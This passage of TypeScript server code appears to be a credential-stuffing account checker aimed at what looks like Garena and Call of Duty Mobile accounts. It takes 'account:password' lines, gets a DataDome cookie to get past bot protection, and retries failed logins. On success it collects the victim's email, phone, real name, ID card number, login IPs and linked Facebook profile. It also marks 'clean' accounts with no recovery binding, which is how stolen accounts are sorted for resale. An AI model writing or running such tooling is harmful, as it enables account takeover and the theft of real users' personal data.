  if (twoStepVerify) securityIndicators.push('2FA');
  if (authenticator) securityIndicators.push('Auth App');
  if (suspicious) securityIndicators.push('Suspicious');
  
  // Facebook details
  const fbUid = typeof fbAccount === 'object' && fbAccount ? (fbAccount.fb_uid as string) || 'N/A' : 'N/A';
  const fbLinked = fbConnected ? `Linked (${fbUid})` : 'Not Linked';
  const fbProfile = fbConnected && fbUid !== 'N/A' ? `https://facebook.com/${fbUid}` : 'N/A';
  
  // Login history
  const loginHistory = (data.login_history as Array<Record<string, unknown>>) || [];
  let lastLoginIp = 'N/A';
  let lastLoginWhere = 'N/A';
  let lastLogin = 'Unknown';
  
  if (Array.isArray(loginHistory) && loginHistory.length > 0) {
    const entry = loginHistory[0];
    lastLoginIp = (entry.ip as string) || (entry.login_ip as string) || (entry.ip_address as string) || 'N/A';
    lastLoginWhere = (entry.country as string) || (entry.location as string) || (entry.region as string) || 'N/A';
    const ts = entry.timestamp;
    if (ts) {
      try {
        const tsInt = Number(ts);
        lastLogin = new Date(tsInt * 1000).toISOString().replace('T', ' ').split('.')[0] + ' UTC';
      } catch { lastLogin = 'Unknown'; }
    }
  }
  
  return {
    uid: userInfo.uid || 'N/A',
    username: userInfo.username || 'N/A',
    nickname: userInfo.nickname || 'N/A',
    email: email,
    email_verified: emailVerified,
    country: accCountry,
    country_code: countryCode,
    shell_balance: userInfo.shell || 0,
    mobile_no: mobileNo || 'N/A',
    mobile_bound: mobileNo && mobileNo.trim() ? 'Yes' : 'No',
    is_clean: isClean,
    bind_status: isClean ? 'Clean' : `Bound (${binds.join(', ') || 'Email Verified'})`,
    binds: binds,
    two_step_verify: twoStepVerify,
    authenticator: authenticator,
    suspicious: suspicious,
    security_status: securityIndicators.length === 0 ? 'Normal' : securityIndicators.join(' | '),
    facebook_connected: fbConnected,
    facebook_linked: fbLinked,
    facebook_profile: fbProfile,
    facebook_uid: fbUid,
    avatar: userInfo.avatar || 'N/A',
    password_strength: userInfo.password_s || 'N/A',
    ip_address: (data.init_ip as string) || lastLoginIp || 'N/A',
    ip_country: (data.country as string) || 'N/A',
    last_login: lastLogin,
    last_login_where: lastLoginWhere,
    account_status: (userInfo.status as number) === 1 ? 'Active' : 'Inactive',
    real_name: userInfo.realname || 'N/A',
    id_card: idCard || 'N/A',
  };
}

// Check if CODM info is invalid - matching v7.py is_codm_invalid()
function isCodmInvalid(info: Record<string, unknown> | null): boolean {
  if (!info) return true;
  const invalidValues = ['', 'N/A', 'NONE', 'NULL', 'ERROR'];
  const allInvalid = Object.values(info).every(v => invalidValues.includes(String(v).trim().toUpperCase()));
  if (allInvalid) return true;
  const nickname = String(info.codm_nickname || '').trim().toUpperCase();
  if (invalidValues.includes(nickname)) return true;
  return false;
}

// Main check account function with retry logic
async function checkAccount(account: string, password: string): Promise<Record<string, unknown>> {
  console.log('[CHECK] Starting:', account);
  
  let lastError = '';
  
  for (let attempt = 0; attempt <= RETRY_CONFIG.maxRetries; attempt++) {
    if (attempt > 0) {
      console.log(`[CHECK] Retry attempt ${attempt}/${RETRY_CONFIG.maxRetries} for: ${account}`);
    }
    
    try {
      // Step 1: Get fresh DataDome cookie
      const datadome = await getDataDomeCookie();
      if (!datadome) {
        lastError = 'Failed to get DataDome cookie';
        console.log('[CHECK] Failed to get DataDome, will retry...');
        if (attempt < RETRY_CONFIG.maxRetries) {
          await retryDelay(attempt);
          continue;
        }
        return {
          account, password,
          status: 'error',
          message: lastError,
          isClean: false, hasCodm: false,
          retryAttempts: attempt + 1
        };
      }
      
      // Step 2: Prelogin with internal retry on 403
      const preloginResult = await prelogin(account, datadome);
      if (!preloginResult) {
        lastError = 'Account not found or DataDome blocked';
        console.log('[CHECK] Prelogin failed, checking if retryable...');
        if (attempt < RETRY_CONFIG.maxRetries) {
          await retryDelay(attempt);
          continue;
        }
        return {
          account, password,
          status: 'invalid',
          message: lastError,
          isClean: false, hasCodm: false,
          retryAttempts: attempt + 1
        };
      }
      
      // Use updated datadome if prelogin returned one
      const activeDatdome = preloginResult.newDatadome || datadome;

      // Step 3: Login
      const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2, activeDatdome);
      if ('error' in loginResult) {
        console.log('[CHECK] Login failed:', loginResult.error);
        return {
          account, password,
          status: 'invalid',
          message: loginResult.error,
          isClean: false, hasCodm: false,
          retryAttempts: attempt + 1
        };
      }

      console.log('[CHECK] Login SUCCESS!');
      
      // Step 4: Get account info
      const accountData = await getAccountInfo(loginResult.ssoKey, activeDatdome);
      const details = accountData ? parseAccountDetails(accountData) : { is_clean: false };

      // Step 5: Check CODM using new OAuth flow (matching v7.py)
      let hasCodm = false;
      let codmInfo: Record<string, unknown> = {};
      
      const codmTokenResult = await getCodmAccessToken(loginResult.ssoKey, activeDatdome);
      if (codmTokenResult) {
        const callbackResult = await processCodmCallback(codmTokenResult.accessToken);
        if (callbackResult.status === 'success' && callbackResult.token) {
          const codmUser = await getCodmUserInfo(callbackResult.token);
          if (codmUser && !isCodmInvalid(codmUser)) {
            hasCodm = true;
            codmInfo = codmUser;
          }
        }
      }

      console.log(`[CHECK] Complete: valid, hasCodm=${hasCodm}, isClean=${details.is_clean}, attempts=${attempt + 1}`);

      return {
        account, password,
        status: 'valid',
        isClean: details.is_clean,
        hasCodm,
        details,
        codm: codmInfo,
        retryAttempts: attempt + 1
      };

    } catch (error) {
      lastError = error instanceof Error ? error.message : String(error);
      console.error(`[CHECK] Error on attempt ${attempt + 1}:`, lastError);
      
      if (attempt < RETRY_CONFIG.maxRetries) {
        await retryDelay(attempt);
        continue;
      }
    }
  }
  
  console.error('[CHECK] All retries exhausted for:', account);
  return {
    account, password,
    status: 'error',
    message: `Failed after ${RETRY_CONFIG.maxRetries + 1} attempts: ${lastError}`,
    isClean: false, hasCodm: false,
    retryAttempts: RETRY_CONFIG.maxRetries + 1
  };
}

// Input validation
interface ValidationResult {
  valid: boolean;
  errors: string[];
}

function validateAccountInput(accounts: unknown): ValidationResult {
  const errors: string[] = [];
  
  if (!Array.isArray(accounts)) {
    errors.push('Accounts must be an array');
    return { valid: false, errors };
  }
  
  if (accounts.length === 0) {
    errors.push('At least one account required');
    return { valid: false, errors };
  }
  
  if (accounts.length > 10) {
    errors.push('Maximum 10 accounts per request');
    return { valid: false, errors };
  }
  
  for (let i = 0; i < accounts.length; i++) {
    const line = accounts[i];
    
    if (typeof line !== 'string') {
      errors.push(`Account ${i + 1}: must be a string`);
      continue;
    }
    
    if (line.length > 500) {
      errors.push(`Account ${i + 1}: exceeds maximum length (500 chars)`);
      continue;
    }
    
    if (!/^[\x20-\x7E]+$/.test(line)) {
      errors.push(`Account ${i + 1}: contains invalid characters`);
      continue;
    }
    
    const parts = line.split(':');
    if (parts.length < 2) {
      errors.push(`Account ${i + 1}: invalid format (use account:password)`);
      continue;
    }
    
    const account = parts[0].trim();
    if (account.length < 3 || account.length > 100) {
      errors.push(`Account ${i + 1}: invalid account/email length`);
      continue;
    }
    
    const isValidUsername = /^[a-zA-Z0-9._-]+$/.test(account);
    const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(account);
    
    if (!isValidUsername && !isValidEmail) {
      errors.push(`Account ${i + 1}: invalid account format (use username or email)`);
      continue;
    }
    
    const password = parts.slice(1).join(':').trim();
    if (password.length < 1 || password.length > 200) {
      errors.push(`Account ${i + 1}: invalid password length`);
    }
  }
  
  return {
    valid: errors.length === 0,
    errors
  };
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const clientId = req.headers.get('x-forwarded-for') || 'unknown';
    console.log('[REQUEST] From:', clientId);

    const rateCheck = checkRateLimit(clientId);
    if (!rateCheck.allowed) {
      return new Response(
        JSON.stringify({ error: 'Rate limit exceeded', retryAfter: rateCheck.retryAfter }),
        { status: 429, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const contentLength = parseInt(req.headers.get('content-length') || '0');
    if (contentLength > 50000) {
      return new Response(
        JSON.stringify({ error: 'Request body too large' }),
        { status: 413, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const { accounts } = await req.json();

    const validation = validateAccountInput(accounts);
    if (!validation.valid) {
      return new Response(
        JSON.stringify({ error: 'Validation failed', details: validation.errors }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const results = [];
    
    for (const line of accounts.slice(0, 1)) {
      const parts = line.split(':');
      if (parts.length < 2) {
        results.push({ account: line, status: 'invalid', message: 'Invalid format' });
        continue;
      }
      
      const result = await checkAccount(parts[0].trim(), parts.slice(1).join(':').trim());
      results.push(result);
      console.log('[RESULT]', parts[0], ':', result.status);
    }

    return new Response(
      JSON.stringify({ results }),
      { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('[ERROR]', error);
    return new Response(
      JSON.stringify({ error: error instanceof Error ? error.message : 'Server error' }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
